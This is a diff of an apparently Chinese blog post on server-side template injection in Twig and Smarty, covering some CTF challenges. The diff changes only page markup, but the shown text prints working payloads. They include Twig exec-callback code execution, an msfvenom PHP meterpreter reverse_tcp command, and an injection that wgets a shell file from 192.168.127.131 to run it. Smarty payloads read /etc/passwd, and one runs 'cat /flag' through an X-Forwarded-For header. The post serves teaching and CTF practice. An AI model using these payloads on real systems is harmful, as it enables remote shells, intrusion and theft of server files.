@@ -202,7 +202,7 @@ https://www.jb51.ne...">
     <div class="head-info">
       <span class="post-info-item"><i class="iconfont iconcalendar"></i>August 25, 2021</span>
       
-      <span class="post-info-item"><i class="iconfont iconfont-size"></i>2424</span>
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>2331</span>
     </div>
   </div>
 </section>
@@ -228,51 +228,51 @@ https://www.jb51.ne...">
 <p>php的tp，java的spring</p>
 <h4 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><p>​        服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p>
 <p>利用图表</p>
-<p><img   class="lazyload" data-original="/2021/08/25/2021/src/leak/1344396-20200911174631687-758048107.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">img</span></p>
+<p><img   class="lazyload" data-original="/2021/08/25/2021/src/leak/1344396-20200911174631687-758048107.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="img"></p>
 <h4 id="Twig模板"><a href="#Twig模板" class="headerlink" title="Twig模板"></a>Twig模板</h4><p>由图可以看出，在经过模板解析后的内容</p>
-<p><img   class="lazyload" data-original="/2021/08/25/2021/src/leak/1344396-20200818195801226-981945295.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">img</span></p>
+<p><img   class="lazyload" data-original="/2021/08/25/2021/src/leak/1344396-20200818195801226-981945295.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="img"></p>
 <p>payload（2.0）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;id&quot;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure>
 
-<p><img   class="lazyload" data-original="/2021/08/25/2021/src/leak/1344396-20200818231853350-914354726.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">img</span></p>
+<p><img   class="lazyload" data-original="/2021/08/25/2021/src/leak/1344396-20200818231853350-914354726.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="img"></p>
 <p>文章还详细介绍了使用msf通过Twig模板注入获取shell</p>
 <p>使用msf生成了一个php meterpreter有效载荷</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp -f raw LHOST=<span class="number">192.168</span><span class="number">.127</span><span class="number">.131</span> LPORT=<span class="number">4321</span> &gt; /<span class="keyword">var</span>/www/html/shell.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">msfvenom -p php/meterpreter/reverse_tcp -f raw LHOST=<span class="hljs-number">192.168</span><span class="hljs-number">.127</span><span class="hljs-number">.131</span> LPORT=<span class="hljs-number">4321</span> &gt; /<span class="hljs-keyword">var</span>/www/html/shell.txt<br></code></pre></td></tr></table></figure>
 
-<p> <img   class="lazyload" data-original="/2021/08/25/2021/src/leak/1344396-20200818232520602-1757346385.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">img</span></p>
+<p> <img   class="lazyload" data-original="/2021/08/25/2021/src/leak/1344396-20200818232520602-1757346385.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="img"></p>
 <p> 模板注入远程下载shell，并重命名运行</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">&quot;wget http://192.168.127.131/shell.txt </span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="hljs-string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="hljs-string">&quot;wget http://192.168.127.131/shell.txt </span><br></code></pre></td></tr></table></figure>
 
-<p><img   class="lazyload" data-original="/2021/08/25/2021/src/leak/1344396-20200818232914668-1182705687.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">img</span></p>
+<p><img   class="lazyload" data-original="/2021/08/25/2021/src/leak/1344396-20200818232914668-1182705687.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="img"></p>
 <h4 id="Smarty模板"><a href="#Smarty模板" class="headerlink" title="Smarty模板"></a>Smarty模板</h4><p>payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&#123;<span class="hljs-attribute">self</span>::<span class="hljs-built_in">getStreamVariable</span>(<span class="hljs-string">&quot;file:///etc/passwd&quot;</span>)&#125;<br></code></pre></td></tr></table></figure>
 
 <p>CTF地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges%EF%BC%88CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BAWeb11%EF%BC%89">https://buuoj.cn/challenges（CISCN2019华东南赛区Web11）</a></p>
 <p>xff头做文章，进行注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For：&#123;sysytem(&#39;cat &#x2F;flag&#39;)&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">X</span>-<span class="hljs-variable">Forwarded</span>-<span class="hljs-variable">For</span>：&#123;<span class="hljs-function"><span class="hljs-title">sysytem</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>)&#125;</span><br></code></pre></td></tr></table></figure>
 
 <p>这题我没有单独写文章，因为解题过程很快，知识点对应上了。</p>
 <p>smarty-ssti常规利用方式</p>
 <p><strong>1. {$smarty.version}</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$smarty.version&#125;  #获取smarty的版本号</span><br></pre></td></tr></table></figure>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&#123;$smarty.<span class="hljs-built_in">version</span>&#125;  <span class="hljs-comment">#获取smarty的版本号</span><br></code></pre></td></tr></table></figure>
 
-<p><img   class="lazyload" data-original="/2021/08/25/2021/src/leak/1344396-20200820233050238-1942906786.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">img</span></p>
+<p><img   class="lazyload" data-original="/2021/08/25/2021/src/leak/1344396-20200820233050238-1942906786.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="img"></p>
 <p><strong>2. {php}{/php}</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;php&#125;phpinfo();&#123;&#x2F;php&#125;  #执行相应的php代码</span><br></pre></td></tr></table></figure>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="hljs-template-variable">&#123;php&#125;</span><span class="xml">phpinfo();</span><span class="hljs-template-tag">&#123;/<span class="hljs-name">php</span>&#125;</span><span class="xml">  #执行相应的php代码</span><br></code></pre></td></tr></table></figure>
 
-<p><img   class="lazyload" data-original="/2021/08/25/2021/src/leak/1344396-20200820233259128-196602210.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">img</span></p>
+<p><img   class="lazyload" data-original="/2021/08/25/2021/src/leak/1344396-20200820233259128-196602210.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="img"></p>
 <p><strong>3. {literal}</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;phpinfo();&lt;&#x2F;script&gt;   </span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;php&quot;</span>&gt;</span>phpinfo();<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>   <br></code></pre></td></tr></table></figure>
 
-<p><img   class="lazyload" data-original="/2021/08/25/2021/src/leak/1344396-20200820233719367-1535357026.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">img</span></p>
+<p><img   class="lazyload" data-original="/2021/08/25/2021/src/leak/1344396-20200820233719367-1535357026.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="img"></p>
 <p><strong>4.</strong> <strong>getstreamvariable</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&#123;<span class="hljs-attribute">self</span>::<span class="hljs-built_in">getStreamVariable</span>(<span class="hljs-string">&quot;file:///etc/passwd&quot;</span>)&#125;<br></code></pre></td></tr></table></figure>
 
-<p><img   class="lazyload" data-original="/2021/08/25/2021/src/leak/1344396-20200820234305773-495371489.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">img</span></p>
+<p><img   class="lazyload" data-original="/2021/08/25/2021/src/leak/1344396-20200820234305773-495371489.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="img"></p>
 <p><strong>5. {if}{/if}</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;&#x2F;if&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;if phpinfo()&#125;&#123;/if&#125;<br></code></pre></td></tr></table></figure>
 
-<p><img   class="lazyload" data-original="/2021/08/25/2021/src/leak/1344396-20200820234610811-341143885.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><span class="image-caption">img</span></p>
+<p><img   class="lazyload" data-original="/2021/08/25/2021/src/leak/1344396-20200820234610811-341143885.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  alt="img"></p>
 <p>python中的ssti</p>
 <p>常见模板有：jinja2， tornado</p>
 <h4 id="Jinjia2"><a href="#Jinjia2" class="headerlink" title="Jinjia2"></a>Jinjia2</h4><p>以Django的模板为模型的</p>
